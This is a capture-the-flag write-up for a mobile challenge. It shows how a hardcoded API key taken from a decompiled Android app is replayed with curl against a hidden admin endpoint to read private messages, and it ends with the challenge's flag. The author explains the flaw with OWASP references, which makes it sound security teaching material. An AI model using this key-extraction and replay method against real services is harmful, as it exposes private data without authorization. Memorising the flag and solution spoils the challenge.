# Whispers in the Wire

## Metadata

| Field | Value |
| --- | --- |
| Category | `mobile` |
| Difficulty | Easy |
| Points | 100 |
| Solves | 185 |
| First Blood | patrickpassos |

## Challenge Description

```text
WhisperChat is the messaging app the office runs on. Here's the decompiled APK
and a little Python client that talks to its backend.
```

## Artifacts

The challenge provided a ZIP with two useful artifacts: a decompiled Android
application and a small Python client for the same backend.

```text
public.zip
extracted/whisper_client.py
extracted/WhisperChat/
solve_whispers.sh
```

Target used during the solve:

```text
https://7daedde136789d51.chal.ctf.ae
```

## Recon

I started by mapping what the provided clients were supposed to do before
looking for a vulnerability. The Python client was the smallest entry point, so
it was useful for understanding the normal backend contract
(`extracted/whisper_client.py`, lines 18-24):

```python
API_BASE = "https://api.whisperchat.internal"
API_KEY = "fluidctf-api-2026-whispers"
HEADERS = {
    "X-API-Key": API_KEY,
    "Content-Type": "application/json",
    "User-Agent": "WhisperChat/1.4.2 (Android 14; SDK 34)",
}
```

The same file only used the regular message routes:

```text
GET  /api/messages
POST /api/messages
```

That told me the challenge was not about guessing request headers; the normal
headers and API key were already in the provided client. The next question was
whether the decompiled Android client contained routes or UI paths that the
Python helper did not expose.

The Android resources confirmed the same backend configuration in
`extracted/WhisperChat/res/values/strings.xml`, lines 24-27:

```xml
<string name="api_base_url">https://api.whisperchat.internal</string>
<string name="api_key">fluidctf-api-2026-whispers</string>
```

`extracted/WhisperChat/sources/com/whisperchat/app/data/ApiClient.java` then
showed how every Retrofit request was built, especially lines 14-28:

```java
private static final String API_KEY = "fluidctf-api-2026-whispers";

Request request = chain.request().newBuilder()
        .header("X-API-Key", API_KEY)
        .header("User-Agent", "WhisperChat/1.4.2 (Android 14; SDK 34)")
        .build();
```

At this point the useful artifact was not just "there is an API key". Mobile
API keys embedded in an APK should be treated as recoverable by users, so I
looked for what that shared key could access.

The route map came from the Retrofit interface in
`extracted/WhisperChat/sources/com/whisperchat/app/data/WhisperApi.java`,
lines 15-25:

```java
@GET("api/messages")
Call<MessageList> getMessages(@Query("recipient") String recipient);

@POST("api/messages")
Call<Message> sendMessage(@Body Message message);

@GET("api/admin/messages")
Call<MessageList> getAdminMessages();
```

This was the first strong lead: the shipped Android code knew an admin endpoint
that the Python client never presented in its menu.

## Vulnerability

The vulnerability is broken function-level authorization on the admin message
feed, combined with a hardcoded shared API key in the distributed clients.

The idea came from joining three local artifacts:

- `whisper_client.py` showed that normal API access only required the shared
  `X-API-Key` header.
- `ApiClient.java` confirmed the Android app also attached that same key to
  every request.
- `WhisperApi.java` exposed `GET /api/admin/messages`, while
  `SettingsActivity.java` showed the admin entry was only hidden in the client
  UI.

The relevant `SettingsActivity.java` code was:

```java
View adminEntry = findViewById(R.id.admin_console_entry);
adminEntry.setVisibility(Session.current().isAdmin() ? View.VISIBLE : View.GONE);
```

The same file also documented what the admin feed contained:

```java
// GET /api/admin/messages returns every channel, including the
// private ops thread that holds the quarterly vault recovery code.
ApiClient.get().getAdminMessages().enqueue(...)
```

Those comments and calls are in
`extracted/WhisperChat/sources/com/whisperchat/app/ui/SettingsActivity.java`,
lines 24-40.

That made the security boundary clear enough to test. A normal user should not
be able to access a staff-only feed by replaying a key extracted from the client.
The server should enforce the user's role on `/api/admin/messages`; hiding a
button in the Android UI does not protect the backend route.

The behavior matches two common mobile/API issues:

- OWASP MASWE-0005: API keys hardcoded in an app package can be extracted by
  reverse engineering.
- OWASP API5:2023: administrative API functions must enforce authorization on
  the server side, not rely on the client choosing not to call them.

## Exploitation

The exploit chain was:

1. Read the provided Python client to learn the expected headers and API key.
2. Inspect the decompiled Android Retrofit interface to discover the hidden
   admin route.
3. Confirm that missing the key is rejected, so the route still expects the
   application's API-key mechanism.
4. Replay the Android client's headers against `/api/admin/messages`.
5. Read the private `ops` message in the returned JSON.

Testing the admin route without the extracted key failed as expected:

```bash
curl -k -i https://7daedde136789d51.chal.ctf.ae/api/admin/messages
```

Representative response:

```text
HTTP/1.1 401 UNAUTHORIZED
{"error":"Unauthorized","message":"Invalid or missing API key"}
```

The regular message feed with the extracted client headers returned only the
public conversation:

```bash
curl -k -i \
  -H 'X-API-Key: fluidctf-api-2026-whispers' \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: WhisperChat/1.4.2 (Android 14; SDK 34)' \
  https://7daedde136789d51.chal.ctf.ae/api/messages
```

Representative response:

```json
{
  "count": 4,
  "messages": [
    {"sender": "alice", "recipient": "bob", "body": "Hey, did you finish the quarterly report?"},
    {"sender": "bob", "recipient": "alice", "body": "Almost done. I'll send it by EOD."}
  ]
}
```

Then I requested the hidden admin endpoint with the same headers:

```bash
curl -k -i \
  -H 'X-API-Key: fluidctf-api-2026-whispers' \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: WhisperChat/1.4.2 (Android 14; SDK 34)' \
  https://7daedde136789d51.chal.ctf.ae/api/admin/messages
```

The server returned `200 OK` and included the private staff thread:

```json
{
  "count": 5,
  "messages": [
    {
      "body": "Vault recovery code for Q2: flag{f919bbff6692b8b3}",
      "private": true,
      "recipient": "ops",
      "sender": "admin",
      "timestamp": "2026-04-09T18:42:00Z"
    }
  ]
}
```

## Technical Details

The API key is not a user credential. It is a static application credential
distributed inside both clients, so any user who receives the challenge files can
recover it and replay it.

The intended authorization model appears to be:

```text
regular user -> /api/messages
staff user   -> /api/admin/messages
```

But the implemented enforcement model was effectively:

```text
request has X-API-Key: fluidctf-api-2026-whispers -> allow route
```

That fails for an admin function. `Session.current().isAdmin()` only changes
whether the Android UI displays the admin console entry; it does not prove any
server-side authorization happened. Once the route name was recovered from the
Retrofit interface, the backend accepted the same shared client key and returned
private messages.

## Exploit Artifact

The final artifact is [solve_whispers.sh](solve_whispers.sh). It sends the same
headers used by the Android client to the hidden admin route.

Usage:

```bash
chmod +x solve_whispers.sh
./solve_whispers.sh https://7daedde136789d51.chal.ctf.ae
```

The script accepts an optional second argument for the API key, but defaults to
the key extracted from the challenge files.

## Validation

Live validation on July 5, 2026:

```text
HTTP/1.1 200 OK
Content-Type: application/json
```

The returned JSON included:

```text
Vault recovery code for Q2: flag{f919bbff6692b8b3}
```

The final script was also validated against the live host:

```bash
./solve_whispers.sh https://7daedde136789d51.chal.ctf.ae
```

Relevant output:

```text
"body":"Vault recovery code for Q2: flag{f919bbff6692b8b3}"
```

## References

- <https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/>
- <https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0005/>

## Flag

```text
flag{f919bbff6692b8b3}
```
